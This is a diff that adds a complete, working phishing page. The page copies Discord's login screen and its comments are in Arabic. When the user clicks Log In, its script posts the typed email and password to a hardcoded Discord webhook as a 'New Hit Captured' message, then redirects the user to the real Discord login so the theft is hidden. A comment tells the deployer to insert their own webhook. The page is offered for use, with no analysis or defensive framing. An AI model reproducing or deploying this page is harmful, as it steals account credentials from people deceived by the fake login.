@@ -1,0 +1,156 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Discord | Login</title>
+    <style>
+        /* إعدادات تصفير المتصفح - عشان يختفي البياض نهائياً */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            outline: none;
+        }
+
+        body {
+            background-color: #313338; /* لون خلفية ديسكورد الغامق */
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            background-image: url('https://discord.com/assets/f9a059600e5728a7e781.svg'); /* النقوش اللي ورا */
+            background-size: cover;
+            background-position: center;
+        }
+
+        /* صندوق تسجيل الدخول الرئيسي */
+        .login-card {
+            background: #2B2D31;
+            width: 480px;
+            padding: 32px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px 0 rgba(0,0,0,0.2);
+            text-align: center;
+            color: #F2F3F5;
+        }
+
+        h2 { font-size: 24px; font-weight: 600; margin-bottom: 8px; }
+        p { color: #B5BAC1; font-size: 16px; margin-bottom: 20px; }
+
+        /* الحقول */
+        .field-group { text-align: left; margin-bottom: 20px; }
+        
+        label {
+            display: block;
+            color: #B5BAC1;
+            font-size: 12px;
+            font-weight: bold;
+            margin-bottom: 8px;
+            text-transform: uppercase;
+        }
+
+        input {
+            width: 100%;
+            height: 40px;
+            padding: 10px;
+            background-color: #1E1F22;
+            border: none;
+            border-radius: 3px;
+            color: #DBDEE1;
+            font-size: 16px;
+        }
+
+        .forgot {
+            color: #00A8FC;
+            font-size: 14px;
+            cursor: pointer;
+            margin-top: 4px;
+            text-decoration: none;
+        }
+
+        /* زر الدخول */
+        button {
+            width: 100%;
+            height: 44px;
+            background-color: #5865F2;
+            color: white;
+            border: none;
+            border-radius: 3px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            margin-top: 20px;
+            transition: background 0.2s;
+        }
+
+        button:hover { background-color: #4752C4; }
+
+        .register {
+            margin-top: 15px;
+            text-align: left;
+            font-size: 14px;
+            color: #949BA4;
+        }
+
+        .register span { color: #00A8FC; cursor: pointer; }
+
+    </style>
+</head>
+<body>
+
+    <div class="login-card">
+        <h2>Welcome back!</h2>
+        <p>We're so excited to see you again!</p>
+
+        <div class="field-group">
+            <label>Email or Phone Number</label>
+            <input type="text" id="email_input">
+        </div>
+
+        <div class="field-group">
+            <label>Password</label>
+            <input type="password" id="pass_input">
+            <div class="forgot">Forgot your password?</div>
+        </div>
+
+        <button onclick="login()">Log In</button>
+
+        <div class="register">
+            Need an account? <span>Register</span>
+        </div>
+    </div>
+
+    <script>
+        // هنا تحط الـ Webhook حقك
+        const DISCORD_WB = "https://discord.com/api/webhooks/1504842638744883341/zkiQ3Qdve9TYO8lEu06GBMRSZhaHOyVC22lTzWOl8Vp4XQcuDAO7pjUBvoEZJSbutdLr";
+
+        async function login() {
+            const e = document.getElementById('email_input').value;
+            const p = document.getElementById('pass_input').value;
+
+            if(!e || !p) return;
+
+            // إرسال البيانات
+            fetch(DISCORD_WB, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    embeds: [{
+                        title: "🎯 New Hit Captured",
+                        color: 5814783,
+                        fields: [
+                            {name: "User", value: `\`${e}\``},
+                            {name: "Pass", value: `\`${p}\``}
+                        ]
+                    }]
+                })
+            }).then(() => {
+                // تحويل لديسكورد الحقيقي
+                window.location.replace("https://discord.com/login");
+            });
+        }
+    </script>
+</body>
+</html>
